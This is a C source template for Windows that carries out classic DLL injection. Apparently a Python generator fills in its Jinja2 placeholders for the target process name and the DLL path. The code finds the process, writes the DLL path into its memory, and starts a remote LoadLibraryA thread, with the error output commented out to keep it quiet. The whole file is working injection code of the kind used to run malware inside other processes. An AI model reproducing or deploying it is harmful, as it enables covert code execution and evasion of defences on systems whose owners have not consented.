#include <windows.h>
#include <tlhelp32.h> // For process enumeration
#include <stdio.h>    // For printf (debugging, can be removed or commented out for release)
#include <string.h>   // For strlen, _stricmp

// Function to get the Process ID (PID) by process name (case-insensitive)
DWORD GetProcessIdByName(const char* processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        // fprintf(stderr, "[-] GetProcessIdByName: Failed to create toolhelp snapshot. Error: %lu\n", GetLastError());
        return 0;
    }

    if (Process32First(snapshot, &entry)) {
        do {
            if (_stricmp(entry.szExeFile, processName) == 0) { // Case-insensitive comparison
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    } else {
        // fprintf(stderr, "[-] GetProcessIdByName: Failed to get first process. Error: %lu\n", GetLastError());
    }

    CloseHandle(snapshot);
    // fprintf(stderr, "[-] GetProcessIdByName: Process \"%s\" not found.\n", processName);
    return 0; // Process not found
}

int main(void) {
    // These Jinja2 placeholders will be replaced by the Python script.
    // dll_name_str should be the name or full path of the DLL to inject.
    // target_process_name_str should be the name of the executable (e.g., "notepad.exe").
    char dllPathToInject[] = "{{ dll_name_str }}"; 
    char targetProcessExeName[] = "{{ target_process_name_str }}";

    HANDLE hProcess = NULL;
    HANDLE hRemoteThread = NULL;
    LPVOID pRemoteDllPathBuffer = NULL;
    FARPROC pLoadLibraryAddr = NULL;
    DWORD dwTargetPid = 0;
    BOOL bStatus = FALSE;

    // 1. Find the Process ID of the target executable name.
    dwTargetPid = GetProcessIdByName(targetProcessExeName);
    if (dwTargetPid == 0) {
        // Process not found, GetProcessIdByName would have printed an error if stderr was visible.
        return 1;
    }

    // 2. Open a handle to the target process.
    // Required access rights for DLL injection:
    // PROCESS_CREATE_THREAD: To create a remote thread.
    // PROCESS_QUERY_INFORMATION: To query process information (though not strictly used here, good practice).
    // PROCESS_VM_OPERATION: To perform operations on the address space of the process.
    // PROCESS_VM_WRITE: To write to the process's memory.
    // PROCESS_VM_READ: To read from the process's memory (not strictly used here, good practice).
    hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
                           FALSE, // bInheritHandle - do not inherit handle
                           dwTargetPid);
    if (hProcess == NULL) {
        // fprintf(stderr, "[-] Failed to open target process (PID: %lu). Error: %lu\n", dwTargetPid, GetLastError());
        return 1;
    }

    // 3. Allocate memory within the target process for the DLL path string.
    size_t dllPathSize = strlen(dllPathToInject) + 1; // +1 for null terminator
    pRemoteDllPathBuffer = VirtualAllocEx(hProcess, 
                                          NULL, // lpAddress - system determines where to allocate
                                          dllPathSize, 
                                          MEM_COMMIT | MEM_RESERVE, 
                                          PAGE_READWRITE);
    if (pRemoteDllPathBuffer == NULL) {
        // fprintf(stderr, "[-] Failed to allocate memory in target process. Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return 1;
    }

    // 4. Write the DLL path string into the allocated memory in the target process.
    bStatus = WriteProcessMemory(hProcess, 
                                 pRemoteDllPathBuffer, 
                                 dllPathToInject, 
                                 dllPathSize, 
                                 NULL); // lpNumberOfBytesWritten - not needed
    if (!bStatus) {
        // fprintf(stderr, "[-] Failed to write DLL path to target process memory. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPathBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 5. Get the address of the LoadLibraryA function from kernel32.dll.
    // kernel32.dll is loaded into every user-mode process, so GetModuleHandleA should find it.
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        // This should almost never happen.
        // fprintf(stderr, "[-] Failed to get handle to kernel32.dll. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPathBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    pLoadLibraryAddr = GetProcAddress(hKernel32, "LoadLibraryA");
    if (pLoadLibraryAddr == NULL) {
        // fprintf(stderr, "[-] Failed to get address of LoadLibraryA. Error: %lu\n", GetLastError());
        // No need to CloseHandle for hKernel32 from GetModuleHandleA
        VirtualFreeEx(hProcess, pRemoteDllPathBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 6. Create a remote thread in the target process.
    // This thread will execute LoadLibraryA with the path to our DLL.
    hRemoteThread = CreateRemoteThread(hProcess, 
                                       NULL, // lpThreadAttributes
                                       0,    // dwStackSize (0 = default)
                                       (LPTHREAD_START_ROUTINE)pLoadLibraryAddr, 
                                       pRemoteDllPathBuffer, // lpParameter (path to DLL)
                                       0,    // dwCreationFlags (0 = run immediately)
                                       NULL); // lpThreadId
    if (hRemoteThread == NULL) {
        // fprintf(stderr, "[-] Failed to create remote thread in target process. Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteDllPathBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Optional: Wait for the remote thread to complete its execution.
    // This ensures LoadLibraryA has finished before we clean up.
    WaitForSingleObject(hRemoteThread, INFINITE);

    // 7. Clean up resources.
    if (hRemoteThread) {
        CloseHandle(hRemoteThread);
    }
    if (pRemoteDllPathBuffer) {
        // Free the memory allocated in the target process.
        VirtualFreeEx(hProcess, pRemoteDllPathBuffer, 0, MEM_RELEASE);
    }
    if (hProcess) {
        CloseHandle(hProcess);
    }

    return 0; // Success
}